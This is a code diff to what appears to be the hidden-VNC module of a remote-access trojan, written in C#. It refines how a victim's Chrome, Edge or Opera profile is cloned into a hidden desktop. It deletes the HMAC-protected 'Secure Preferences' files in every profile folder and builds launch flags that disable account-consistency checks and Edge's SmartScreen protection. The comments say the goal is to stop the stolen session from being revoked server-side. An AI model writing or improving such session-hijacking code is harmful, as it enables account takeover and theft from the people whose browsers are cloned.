@@ -2145,9 +2145,14 @@ internal static class HvncFeature
                     Thread.Sleep(200); // let OS finish releasing the directory before clone starts
                     CloneProfileWithProgress(realProfile, hvncProfile, $"Cloning {hvncDirName}...");
                     // Secure Preferences is HMAC-protected; cloning to a different path breaks the HMAC
-                    // → Chrome resets sign-in state. Delete it so Chrome regenerates a clean one.
-                    foreach (var sub in new[] { "Default", "Profile 1", "Profile 2", "Profile 3", "Guest Profile" })
-                        try { File.Delete(Path.Combine(hvncProfile, sub, "Secure Preferences")); } catch { }
+                    // → Chrome resets sign-in state. Enumerate all subdirs so profiles beyond
+                    // "Profile 3" (Profile 4, Profile 5, …) are also covered.
+                    try
+                    {
+                        foreach (var sub in Directory.EnumerateDirectories(hvncProfile))
+                            try { File.Delete(Path.Combine(sub, "Secure Preferences")); } catch { }
+                    }
+                    catch { }
                     StubLog.Info($"[HVNC] Profile cloned '{realProfile}' → '{hvncProfile}'");
                 }
                 else
@@ -2187,6 +2192,19 @@ internal static class HvncFeature
                         cmd = (cmd[..ui] + (ei < cmd.Length ? cmd[ei..] : "")).Trim();
                     }
                 }
+                // Build a single --disable-features flag. Chromium's CommandLine stores switches in a
+                // map keyed by name — duplicate flags overwrite each other, so appending a second
+                // --disable-features for Edge/Opera would silently drop AccountConsistency and
+                // DiceIntegration, leaving the cloned session vulnerable to server-side sign-out.
+                var disableFeatures = new System.Collections.Generic.List<string>
+                {
+                    "AccountConsistency", "DiceIntegration"
+                };
+                if (exeBase == "msedge.exe")
+                    disableFeatures.AddRange(new[] { "msEdgeRecovery", "msSmartScreenProtection" });
+                if (exeBase == "opera.exe")
+                    disableFeatures.Add("OperaCrashRestoreSession");
+
                 cmd += $" --user-data-dir=\"{hvncProfile}\"" +
                        " --start-maximized" +
                        " --no-first-run --no-default-browser-check --disable-default-apps" +
@@ -2194,16 +2212,10 @@ internal static class HvncFeature
                        " --noerrdialogs --disable-session-crashed-bubble" +
                        " --disable-restore-session-state --disable-crash-reporter" +
                        " --no-recovery-component" +
-                       // Prevent Google's account validation endpoint from revoking the cloned session.
-                       // AccountConsistency/DiceIntegration sync browser sign-in state with Google cookies —
-                       // disabling them stops the "signed in → immediately signed out" behavior on clone.
                        " --disable-sync" +
-                       " --disable-features=AccountConsistency,DiceIntegration";
+                       $" --disable-features={string.Join(',', disableFeatures)}";
                 if (exeBase == "msedge.exe")
-                    cmd += " --disable-features=msEdgeRecovery,msSmartScreenProtection" +
-                           " --hide-crash-restore-bubble";
-                if (exeBase == "opera.exe")
-                    cmd += " --disable-features=OperaCrashRestoreSession";
+                    cmd += " --hide-crash-restore-bubble";
             }
             else if (_qtManyApps.Contains(exeBase))
             {
